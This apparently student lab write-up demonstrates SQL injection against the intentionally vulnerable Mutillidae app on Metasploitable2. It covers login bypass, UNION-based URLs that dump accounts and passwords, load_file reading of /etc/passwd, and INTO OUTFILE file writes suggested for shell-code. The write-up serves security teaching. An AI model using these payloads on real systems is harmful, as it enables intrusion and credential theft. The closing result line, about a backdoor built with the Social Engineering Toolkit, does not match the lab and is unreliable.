# Metasploit
Exploiting SQL Injection vulnerability

# AIM:
To exploit SQL Injection vulnerability using Multidae web application in Metasploitable2

## DESIGN STEPS:

### Step 1:

Install kali linux either in partition or virtual box or in live mode


### Step 2:

Investigate on the various categories of tools as follows:

### Step 3:

Open terminal and try execute some kali linux commands

## EXECUTION STEPS AND ITS OUTPUT:
SQL Injection is a sort of infusion assault that makes it conceivable to execute malicious SQL statements. These statements control a database server behind a web application. Assailants can utilize SQL Injection vulnerabilities to sidestep application safety efforts. They can circumvent authentication and authorization of a page or web application and recover the content of the whole SQL database. 
Identify IP address using ifconfig in Metasploitable2

![VirtualBox_MS2_29_04_2024_08_53_13](https://github.com/MaheshS03/EH-Ex-08/assets/128498431/c510461f-7734-42e2-b62f-7a2f425c4810)


Use the above ip address to access the apache webserver of Metasploitable2 from kali linux. In Kali Linux use the ip address in a web browser.

![VirtualBox_kali-linux-2023 4-virtualbox-amd64_29_04_2024_08_54_55](https://github.com/MaheshS03/EH-Ex-08/assets/128498431/7a402b15-fd05-455d-ad20-f7a8850cadfb)




Select Multidae from the menu listed as shown above. You will get the page as displayed below:

![VirtualBox_kali-linux-2023 4-virtualbox-amd64_29_04_2024_08_55_38](https://github.com/MaheshS03/EH-Ex-08/assets/128498431/8fff41f5-8bea-43e5-b390-a705e444f6f0)


Click on the menu Login/Register and register for an account

![VirtualBox_kali-linux-2023 4-virtualbox-amd64_29_04_2024_08_56_53](https://github.com/MaheshS03/EH-Ex-08/assets/128498431/5ba52a7d-727d-45bf-bbde-c287e5aee12f)


Click on the link “Please register here”

![VirtualBox_kali-linux-2023 4-virtualbox-amd64_29_04_2024_08_57_34](https://github.com/MaheshS03/EH-Ex-08/assets/128498431/c42db4d9-1474-4b2c-9449-ac8fe503d07e)



Click on “Create Account” to display the following page:

![VirtualBox_kali-linux-2023 4-virtualbox-amd64_30_04_2024_08_25_26](https://github.com/MaheshS03/EH-Ex-08/assets/128498431/e3852387-5aee-4910-a4af-7c48645eaebe)




The login structure we will use in our examples is straightforward. It contains two input fields (username and password), which are both vulnerable. The back-end content creates a query to approve the username and secret key given by the client. Here is an outline of the page rationale:

($query = “SELECT * FROM users WHERE username=’$_POST[username]’ AND password=’$_POST[password]’“;).
 For the username put “ganesh” or “anything” and for the password put (anything’ or ‘1’=’1) or (admin’ or ‘1’=’1) then try to log in, and you’ll be presented with an admin login page.
![VirtualBox_kali-linux-2023 4-virtualbox-amd64_30_04_2024_08_12_49](https://github.com/MaheshS03/EH-Ex-08/assets/128498431/ea454185-462a-49c4-b034-377fb832d83b)


Click “Login”. The logged in page will show as below:

![VirtualBox_kali-linux-2023 4-virtualbox-amd64_30_04_2024_08_27_16](https://github.com/MaheshS03/EH-Ex-08/assets/128498431/70317947-1109-4910-b09b-d01028bb2553)


## Bypassing login field

*The username field is vulnerable. Put (ganesh’ #) or (ganesh’--) in the username field and hit “Enter” to log in. We use “#” or “--” to comment everything in the query sentence that comes after the username filed telling the database to disregard the password field: (SELECT * FROM users WHERE username=’admin’ # AND password=’ ‘). By using line commenting, the aggressor eliminates a part of the login condition and gains access. This technique will make the “WHERE” clause true only for one user; in this case, it is “ganesh.”
=================================================================*
If you face error in registration follow the following steps in metasploitable 2:



This issue is caused by a misconfiguration in the config.inc located in the /var/www/mutillidae folder on Metasploitable 2 VM.

Edit config.inc
Edit config.inc file located in /var/www/mutillidae folder on Metasploitable 2 by typing the following commands [one at the time]:
cd /
sudo nano /var/www/mutillidae/config.inc
Type msfadmin when prompted for the root password. 
Once nano opens config.inc file, look for the line $dbname = ‘metasploit’ as shown in Figure  below:

![VirtualBox_MS2_30_04_2024_08_20_16](https://github.com/MaheshS03/EH-Ex-08/assets/128498431/4f8dfcfc-861c-421b-8a87-3fae2da4112d)



Replace ‘metasploit’ with ‘owasp10’ and make sure the lines end with semicolon ; as shown in Figure

![VirtualBox_MS2_30_04_2024_08_23_55](https://github.com/MaheshS03/EH-Ex-08/assets/128498431/f3a86786-43d4-4bab-800f-a635e9027212)



Save and exit the config.inc
Save than exit the config.inc file by typing CTRL+X keys on your keyboard and the Y [Enter] when prompted to save the file
Restart the Apache server
To restart Apache, type the following command in the terminal. Alternatively, you can just reboot Metasploitalbe 2 VM.
sudo /etc/init.d/apache2 reload

![image](https://github.com/MaheshS03/EH-Ex-08/assets/128498431/c4877bf4-1f2e-458c-8914-be031f8a29a3)

 Reset Mutillidae database
Refresh the page then clicking on the Reset DB menu option to reset the Mutillidae database [Figure ]. Click OK when prompted.

![image](https://github.com/MaheshS03/EH-Ex-08/assets/128498431/8241de7b-2eee-4aee-8c68-965d5de26c60)

Test the new configuration
Alright. Now is time to test if we managed to fix the database issue. Go ahead and register a new account on the Mutillidae webpage.

 The Mutillidae database error no longer appears 

 ![image](https://github.com/MaheshS03/EH-Ex-08/assets/128498431/5fbea0a1-4d33-43f7-8a3a-b583ba84f709)


===============================================================

Now after logging out you will see the login page. In the login page give ganesh’ # . You can see the page now enters into the administrator page as before when giving the password. 

![image](https://github.com/MaheshS03/EH-Ex-08/assets/128498431/232a94d5-9e3a-4f2e-96cf-d47109a8f07d)

Click the login button and you will see it enter into the administrator page.

![image](https://github.com/MaheshS03/EH-Ex-08/assets/128498431/8ca53728-13e8-49cd-8d32-f918e324d40b)



## Union-based SQL injection

UNION-based SQL injection assaults enable the analyzer to extract data from the database effectively. Since the “UNION” operator must be utilized if the two inquiries have precisely the same structure, the attacker must craft a “SELECT” statement like the first inquiry. 
we will be using the “User Info” page from Mutillidae to perform a Union-Based SQL injection attack. Go to “OWASP Top 10/A1 — Injection/SQLi — Extract-Data/User Info” 

After logging out, Now choose the menu as shown below:

![image](https://github.com/MaheshS03/EH-Ex-08/assets/128498431/2f08b0be-73c1-4d38-a8f2-6fb9c9ee97d6)

![image](https://github.com/MaheshS03/EH-Ex-08/assets/128498431/c3550907-fc49-4f2d-9e96-b1e92fb1eecc)


![image](https://github.com/MaheshS03/EH-Ex-08/assets/128498431/da7fc5bd-13d7-40a5-8490-34140583608e)

![image](https://github.com/MaheshS03/EH-Ex-08/assets/128498431/dfe89777-c6ba-4e7f-a090-516d7c775b3b)

![image](https://github.com/MaheshS03/EH-Ex-08/assets/128498431/b647fad5-0a4c-4565-bd8d-19e13e558785)


From this point, all our attack vectors will be performed in the URL section of the page using the Union-Based technique.There are two different ways to discover how many columns are selected by the original query. The first is to infuse an “ORDER BY” statement indicating a column number. Given the column number specified is higher than the number of columns in the “SELECT” statement, an error will be returned.

![image](https://github.com/MaheshS03/EH-Ex-08/assets/128498431/ba5ccd5c-46a6-408f-8087-96cc7a5035b5)






Since we do not know the number of columns, we start at 1. To find the exact amount of columns, the number is incremented until an error related to the “ORDER BY” clause is returned. In this example, we incremented it to 6 and received an error message, so it means that the number of columns is lower than 6.

The browser url of this info page need to be modified with the url as below:

http://192.168.43.145/mutillidae/index.php?page=user-info.php&username=ganesh%27order%20by%206%23&password=&user-info-php-submit-button=View+Account+Details

![image](https://github.com/MaheshS03/EH-Ex-08/assets/128498431/ec1ed6fd-8be3-4acb-bafa-baebdc7ae63c)


After adding the order by 6 into the existing url , the following error statement will be obtained:

![image](https://github.com/MaheshS03/EH-Ex-08/assets/128498431/5e07cbd6-011f-496b-81f0-3fe7d005d6b0)

When we ordered by 5, it worked and displayed some information. It means there are five columns that we can work with. Following screenshot shows that the url modified to have statement added with ordered by 5 replacing 6.

![image](https://github.com/MaheshS03/EH-Ex-08/assets/128498431/6b0853d9-8096-408c-92ba-7e007358d55a)

 As it is having 5 columns the query worked fine and it provides the correct result

![image](https://github.com/MaheshS03/EH-Ex-08/assets/128498431/8363fdb3-1841-44a0-afed-514b8a0020dd)


Instead of using the "order by" option, let’s use the "union select" option and provide all five columns. Ex: (union select 1,2,3,4,5).

![image](https://github.com/MaheshS03/EH-Ex-08/assets/128498431/b20f2f95-dd8f-4543-8f36-b8b7eec1c5cb)

As given in the screenshot below columns 2,3,4 are usable in which we can substitute any sql commands to extract necessary information.

![image](https://github.com/MaheshS03/EH-Ex-08/assets/128498431/57e2c3d2-06ee-4bc4-8c99-e624f73ada69)


Now we will substitute some few commands like database(), user(), version() to obtain the information regarding the database name, username and version of the database.

http://192.168.43.145/mutillidae/index.php?page=user-info.php&username=ganesh%27union%20select%201,database(),user(),version(),5%23&password=&user-info-php-submit-button=View+Account+Details

![image](https://github.com/MaheshS03/EH-Ex-08/assets/128498431/de8dd947-e5f5-4583-8aa6-f47cbbdc5667)


The url when executed, we obtain the necessary information about the database name owasp10, username as root@localhost and version as 5.0.51a-3ubuntu5.
In MySQL, the table “information_schema.tables” contains all the metadata identified with table items. Below is listed the most useful information on this table.

Replace the query in the url with the following one:
union select 1,table_name,null,null,5 from information_schema.tables where table_schema = ‘owasp10’


http://192.168.43.145/mutillidae/index.php?page=user-info.php&username=ganesh%27union%20select%201,table_name,null,null,5%20from%20information_schema.tables%20where%20table_schema=%27owasp10%27%23&password=&user-info-php-submit-button=View+Account+Details

![image](https://github.com/MaheshS03/EH-Ex-08/assets/128498431/52b5dbe5-1000-4294-a8c5-4a4bdcee023a)

The url once executed will  retrieve table names from the “owasp 10” database.
##Extracting sensitive data such as passwords 

When the attacker knows table names, he needs to discover what the column names are to extract data.

In MySQL, the table “information_schema.columns” gives data about columns in tables. One of the most useful columns to extract is called “column_name.”

Ex: (union select 1,colunm_name,null,null,5 from information_schema.columns where table_name = ‘accounts’).

Here we are trying to extract column names from the “accounts” table.


![image](https://github.com/MaheshS03/EH-Ex-08/assets/128498431/1cd2ae74-de62-4976-ab75-b2adceb7d04d)




The column names of the accounts is displayed below for the following url:

http://192.168.43.145/mutillidae/index.php?page=user-info.php&username=ganesh%27union%20select%201,column_name,null,null,5%20from%20information_schema.columns%20where%20table_name=%27accounts%27%23&password=&user-info-php-submit-button=View+Account+Details 

![image](https://github.com/MaheshS03/EH-Ex-08/assets/128498431/f4e0aa43-4ab2-48e0-8d29-682c133ff65d)


Once we discovered all available column names, we can extract information from them by just adding those column names in our query sentence.

Ex: (union select 1,username,password,is_admin,5 from accounts).

http://192.168.1.9/mutillidae/index.php?page=user-info.php&username=ganesh%27union%20select%201,username,password,is_admin,5%20from%20accounts%23&password=&user-info-php-submit-button=View+Account+Details

![image](https://github.com/MaheshS03/EH-Ex-08/assets/128498431/e1399124-38b6-4a83-8ef1-256d19677de5)


## Reading and writing files on the web-server
We can use the “LOAD_FILE()” operator to peruse the contents of any file contained within the web-server. We will typically check for the “/etc/password” file to see if we get lucky and scoop usernames and passwords to possible use in brute force attacks later.

Ex: (union select null,load_file(‘/etc/passwd’),null,null,null).

http://192.168.1.9/mutillidae/index.php?page=user-info.php&username=ganesh%27union%20select%20null,load_file(%27/etc/passwd%27),null,null,null%23&password=&user-info-php-submit-button=View+Account+Details

![image](https://github.com/MaheshS03/EH-Ex-08/assets/128498431/c4fee8c7-5f83-4f3f-a1d6-3e5ac848e30b)


the “INTO_OUTFILE()” operator for all that they offer and attempt to root the objective server by transferring a shell-code through SQL infusion. we will write a “Hello World!” sentence and output it in the “/tmp/” directory as a “hello.txt” file. This “Hello World!” sentence can be substituted with any PHP shell-code that you want to execute in the target server.
Ex: (union select null,’Hello World!’,null,null,null into outfile ‘/tmp/hello.txt’).





## RESULT:
The Social Engineering Toolkit (SET) is used to create backdoor is  examined successfully
